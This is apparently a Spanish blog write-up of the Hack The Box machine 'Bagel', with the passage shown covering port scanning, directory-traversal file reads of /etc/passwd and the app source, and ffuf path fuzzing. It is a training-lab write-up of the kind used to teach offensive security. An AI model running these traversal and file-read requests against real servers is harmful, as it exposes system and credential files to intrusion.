@@ -1,0 +1,727 @@
+<!doctype html><html lang="es"><head><title>Bagel | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que es vulnerable a lectura de archivos locales. Con esto, podemos leer el código fuente de la aplicación web y ver que hay un servidor WebSocket que usa C# .NET con una DLL para procesar los mensajes. Podemos descargar y aplicar ingeniería inversa a la DLL para leer el código fuente en C#. El programa deserializa los datos JSON y hay un fallo que nos permite reutilizar una clase del código para leer archivos arbitrarios del servidor. Con esto, podemos leer la clave privada de SSH de un usuario y luego cambiar a otro usuario con una contraseña que también aparecía en la DLL. Este usuario puede ejecutar dotnet con sudo, que puede usarse para escalar privilegios"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que es vulnerable a lectura de archivos locales. Con esto, podemos leer el código fuente de la aplicación web y ver que hay un servidor WebSocket que usa C# .NET con una DLL para procesar los mensajes. Podemos descargar y aplicar ingeniería inversa a la DLL para leer el código fuente en C#. El programa deserializa los datos JSON y hay un fallo que nos permite reutilizar una clase del código para leer archivos arbitrarios del servidor. Con esto, podemos leer la clave privada de SSH de un usuario y luego cambiar a otro usuario con una contraseña que también aparecía en la DLL. Este usuario puede ejecutar dotnet con sudo, que puede usarse para escalar privilegios"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que es vulnerable a lectura de archivos locales. Con esto, podemos leer el código fuente de la aplicación web y ver que hay un servidor WebSocket que usa C# .NET con una DLL para procesar los mensajes. Podemos descargar y aplicar ingeniería inversa a la DLL para leer el código fuente en C#. El programa deserializa los datos JSON y hay un fallo que nos permite reutilizar una clase del código para leer archivos arbitrarios del servidor. Con esto, podemos leer la clave privada de SSH de un usuario y luego cambiar a otro usuario con una contraseña que también aparecía en la DLL. Este usuario puede ejecutar dotnet con sudo, que puede usarse para escalar privilegios"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que es vulnerable a lectura de archivos locales. Con esto, podemos leer el código fuente de la aplicación web y ver que hay un servidor WebSocket que usa C# .NET con una DLL para procesar los mensajes. Podemos descargar y aplicar ingeniería inversa a la DLL para leer el código fuente en C#. El programa deserializa los datos JSON y hay un fallo que nos permite reutilizar una clase del código para leer archivos arbitrarios del servidor. Con esto, podemos leer la clave privada de SSH de un usuario y luego cambiar a otro usuario con una contraseña que también aparecía en la DLL. Este usuario puede ejecutar dotnet con sudo, que puede usarse para escalar privilegios"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que es vulnerable a lectura de archivos locales. Con esto, podemos leer el código fuente de la aplicación web y ver que hay un servidor WebSocket que usa C# .NET con una DLL para procesar los mensajes. Podemos descargar y aplicar ingeniería inversa a la DLL para leer el código fuente en C#. El programa deserializa los datos JSON y hay un fallo que nos permite reutilizar una clase del código para leer archivos arbitrarios del servidor. Con esto, podemos leer la clave privada de SSH de un usuario y luego cambiar a otro usuario con una contraseña que también aparecía en la DLL. Este usuario puede ejecutar dotnet con sudo, que puede usarse para escalar privilegios"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images-draft/HTB/Bagel/Bagel.png"><meta name="twitter:image" content="https://7rocky.github.io/images-draft/HTB/Bagel/Bagel.png"><meta property="og:image" content="https://7rocky.github.io/images-draft/HTB/Bagel/Bagel.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Bagel"><meta property="twitter:title" content="Bagel"><meta property="og:title" content="Bagel"><meta property="og:url" content="https://7rocky.github.io/htb/bagel/"><meta itemprop="keywords" content="sudo,reversing,insecure-deserialization,directory-path-traversal,static-code-analysis,lfr,password-reuse,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/bagel/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/bagel/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/bagel/&amp;text=Bagel" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/bagel/&amp;title=Bagel" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Bagel</h1><time class="mt4 f6 dib tracked" datetime="2023-02-24T00:00:00+01:00">24 / 02 / 2023</time><br><p class="mb4 f6 dib tracked">16 minutos de lectura</p></header><div class="htb-image"><img alt="Bagel" src="/images-draft/HTB/Bagel/Bagel.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/reversing" title="Ingeniería inversa">Ingeniería inversa</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/insecure-deserialization" title="Deserialización insegura">Deserialización insegura</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/directory-path-traversal" title="Navegación de directorios">Navegación de directorios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/lfr" title="Lectura de Archivos Locales">Lectura de Archivos Locales</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#explotación-de-lfr">Explotación de LFR</a></li><li><a href="#ingeniería-inversa-de-la-dll">Ingeniería inversa de la DLL</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#ataque-de-deserialización">Ataque de deserialización</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.201</li><li><strong>Fecha</strong>: 24 / 02 / 2023</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.201 -p 22,5000,8000
+Nmap scan report for 10.10.11.201
+Host is up (0.069s latency).
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
+| ssh-hostkey:
+|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
+|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
+5000/tcp open  upnp?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 400 Bad Request
+|     Server: Microsoft-NetCore/2.0
+|     Date:
+|     Connection: close
+|   HTTPOptions:
+|     HTTP/1.1 400 Bad Request
+|     Server: Microsoft-NetCore/2.0
+|     Date:
+|     Connection: close
+|   Help, SSLSessionReq, TerminalServerCookie:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/html
+|     Server: Microsoft-NetCore/2.0
+|     Date:
+|     Content-Length: 52
+|     Connection: close
+|     Keep-Alive: true
+|     &lt;h1&gt;Bad Request (Invalid request line (parts).)&lt;/h1&gt;
+|   RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/html
+|     Server: Microsoft-NetCore/2.0
+|     Date:
+|     Content-Length: 54
+|     Connection: close
+|     Keep-Alive: true
+|     &lt;h1&gt;Bad Request (Invalid request line (version).)&lt;/h1&gt;
+|   TLSSessionReq:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/html
+|     Server: Microsoft-NetCore/2.0
+|     Date:
+|     Content-Length: 52
+|     Connection: close
+|     Keep-Alive: true
+|_    &lt;h1&gt;Bad Request (Invalid request line (parts).)&lt;/h1&gt;
+8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
+|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
+| http-title: Bagel &mdash; Free Website Template, Free HTML5 Template by fr...
+|_Requested resource was http://bagel.htb:8000/?page=index.html
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.1 404 NOT FOUND
+|     Server: Werkzeug/2.2.2 Python/3.10.9
+|     Date:
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html lang=en&gt;
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+|   GetRequest:
+|     HTTP/1.1 302 FOUND
+|     Server: Werkzeug/2.2.2 Python/3.10.9
+|     Date:
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 263
+|     Location: http://bagel.htb:8000/?page=index.html
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html lang=en&gt;
+|     &lt;title&gt;Redirecting...&lt;/title&gt;
+|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href="http://bagel.htb:8000/?page=index.html"&gt;http://bagel.htb:8000/?page=index.html&lt;/a&gt;. If not, click the link.  
+|   Socks5:
+|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+|     "http://www.w3.org/TR/html4/strict.dtd"&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request syntax ('
+|     ').&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 105.61 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 5000 y 8000 (HTTP).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.201:8000</code>, se nos redirige a <code>http://bagel.htb:8000/?page=index.html</code>. Después de configurar el dominio en <code>/etc/hosts</code>, vemos esta página web:</p><p><img src="/images-draft/HTB/Bagel/Bagel-1.png" alt="Bagel 1"></p><p>El parámetro <code>page</code> tienen toda la pinta de ser vulnerable a <em>Local File Read</em> (LFR) o <em>Local File Inclusion</em> (LFI). Podemos probarlo usando <code>./index.html</code>:</p><p><img src="/images-draft/HTB/Bagel/Bagel-2.png" alt="Bagel 2"></p><p>Usando <em>Directory Traversal</em>, podemos leer archivos del servidor como <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'bagel.htb:8000/?page=../../../../etc/passwd'</span>
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
+systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
+polkitd:x:998:997:User for polkitd:/:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin  
+cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
+cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+chrony:x:994:992::/var/lib/chrony:/sbin/nologin
+dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
+systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
+developer:x:1000:1000::/home/developer:/bin/bash
+phil:x:1001:1001::/home/phil:/bin/bash
+_laurel:x:987:987::/var/log/laurel:/bin/false
+</code></pre></div><p>Aquí vemos que <code>phil</code> y <code>developer</code> son usuarios válidos en el sistema. Antes de seguir adelante, hay otro <em>endpoint</em> en <code>/orders</code>, pero no sabemos qué es todavía:</p><p><img src="/images-draft/HTB/Bagel/Bagel-3.png" alt="Bagel 3"></p><h3 id="explotación-de-lfr">Explotación de LFR</h3><p>Un objetivo para las vulnerabilidades LFR / LFI es intentar leer el código fuente. Sin embargo, necesitamos conocer la ruta absoluta o relativa. Para esto, podemos usar <code>ffuf</code>, y probar varias palabras hasta que descubramos una que coincida. Esta es la idea:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/common.txt -u <span class="code-dark-yellow">'http://bagel.htb:8000/?page=../FUZZ/index.html'</span> -fs 14  
+
+<span class="code-dark-green">[Status: 200, Size: 8698, Words: 745, Lines: 188, Duration: 73ms]</span>
+    * FUZZ: static
+</code></pre></div><p>Muy bien, entonces <code>static</code> es el directorio que contiene <code>index.html</code>. Sigamos subiendo hasta el directorio raíz:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/common.txt -u <span class="code-dark-yellow">'http://bagel.htb:8000/?page=../../FUZZ/static/index.html'</span> -fs 14
+
+<span class="code-dark-green">[Status: 200, Size: 8698, Words: 745, Lines: 188, Duration: 51ms]</span>
+    * FUZZ: app
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/common.txt -u <span class="code-dark-yellow">'http://bagel.htb:8000/?page=../../../FUZZ/app/static/index.html'</span> -fs 14
+
+<span class="code-dark-green">[Status: 200, Size: 8698, Words: 745, Lines: 188, Duration: 48ms]</span>
+    * FUZZ: developer
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/common.txt -u <span class="code-dark-yellow">'http://bagel.htb:8000/?page=../../../../FUZZ/developer/app/static/index.html'</span> -fs 14  
+
+<span class="code-dark-green">[Status: 200, Size: 8698, Words: 745, Lines: 188, Duration: 62ms]</span>
+    * FUZZ: home
+</code></pre></div><p>Genial, por lo que la ruta absoluta es <code>/home/developer/app/static/index.html</code>. Por la cabecera HTTP <code>Server</code>, sabemos que el servidor está usando Python (probablemente Flask):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -I 10.10.11.201:8000
+HTTP/1.1 302 FOUND
+<span class="code-white">Server</span>: Werkzeug/2.2.2 Python/3.10.9
+<span class="code-white">Date</span>: Tue, 28 Feb 2023 23:02:39 GMT
+<span class="code-white">Content-Type</span>: text/html; charset=utf-8
+<span class="code-white">Content-Length</span>: 263
+<span class="code-white">Location</span>: http://bagel.htb:8000/?page=index.html  
+<span class="code-white">Connection</span>: close
+</code></pre></div><p>Por lo tanto, podemos intentar encontrar archivos fuente con extensión <code>.py</code>. Vamos a enumerar en <code>/home/developer/app</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/common.txt -u <span class="code-dark-yellow">'http://bagel.htb:8000/?page=../../../../home/developer/app/FUZZ'</span> -fs 14 -e .py  
+
+<span class="code-dark-green">[Status: 200, Size: 1235, Words: 319, Lines: 38, Duration: 54ms]</span>
+    * FUZZ: app.py
+</code></pre></div><p>Bien, leamos el archivo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'bagel.htb:8000/?page=../../../../home/developer/app/app.py'</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">flask</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">Flask</span><span class="mtk1">, </span><span class="mtk1">request</span><span class="mtk1">, </span><span class="mtk8">send_file</span><span class="mtk1">, </span><span class="mtk8">redirect</span><span class="mtk1">, </span><span class="mtk8 mtku">Response</span>
+<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8 mtku">path</span>
+<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">websocket</span><span class="mtk1">,</span><span class="mtk8 mtku">json</span>
+
+<span class="mtk1">app</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Flask</span><span class="mtk1">(</span><span class="mtk1">__name__</span><span class="mtk1">)</span>
+
+<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)</span>
